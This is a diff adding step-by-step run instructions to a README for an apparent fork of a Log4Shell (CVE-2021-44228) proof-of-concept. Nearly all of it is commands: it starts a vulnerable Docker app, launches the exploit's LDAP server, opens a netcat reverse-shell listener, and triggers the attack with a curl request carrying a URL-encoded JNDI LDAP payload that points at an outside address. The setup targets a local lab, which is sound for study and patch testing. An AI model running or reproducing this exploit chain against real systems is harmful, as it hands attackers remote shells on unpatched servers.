@@ -1,3 +1,45 @@
+> forked from: https://github.com/kozmer/log4j-shell-poc
+
+how to run it:
+
+### prerequisites
+
+- install python requirements
+  - `pip install colorama`
+  - `pip install argparse`
+- follow the following instruction to download jdk 1.8 and make alias
+  - download the archived jdk 1.8
+  - make soft links
+    - `ln -s /Library/Java/JavaVirtualMachines/jdk1.8.0_202.jdk/Contents/Home/bin/java java`
+    - `ln -s /Library/Java/JavaVirtualMachines/jdk1.8.0_202.jdk/Contents/Home/bin/javac javac`
+- modify `poc.py` to use the softlinked `java` and `javac`
+
+### run ther vulnerable app
+
+- `docker run -d -p 127.0.0.1:8080:8080 log4j-shell-poc`
+- `docker ps`: get the current image name(for example: `06dcfc80`)
+- `docker logs -f --tail=10 06dcfc80`
+- `docker exec -i -t 06dcfc802652 /bin/bash`
+
+### prepare LDAP server and generate the exploit&
+
+- `pip install argparse`
+- `pip install colorama`
+- `python3 poc.py --userip ${YOUR_IP} --webport 8000 --lport 9001`
+
+> NOTE: `${YOUR_IP}` should be available to docker vulnerable app
+> So `localhost`/`127.0.0.1` is not valid.
+
+### reverse shell listening
+
+- `nc -lvn 9001`
+
+### trigger the exploit
+
+`curl 'http://localhost:8080/login' -X POST -d 'uname=%24%7Bjndi%3Aldap%3A%2F%2F192.168.31.92%3A1389%2Fa%7D&password=hello'`
+
+> Note: `uname` should be URLComponentEncoded
+
 # log4j-shell-poc
 A Proof-Of-Concept for the recently found CVE-2021-44228 vulnerability. <br><br>
 Recently there was a new vulnerability in log4j, a java logging library that is very widely used in the likes of elasticsearch, minecraft and numerous others.
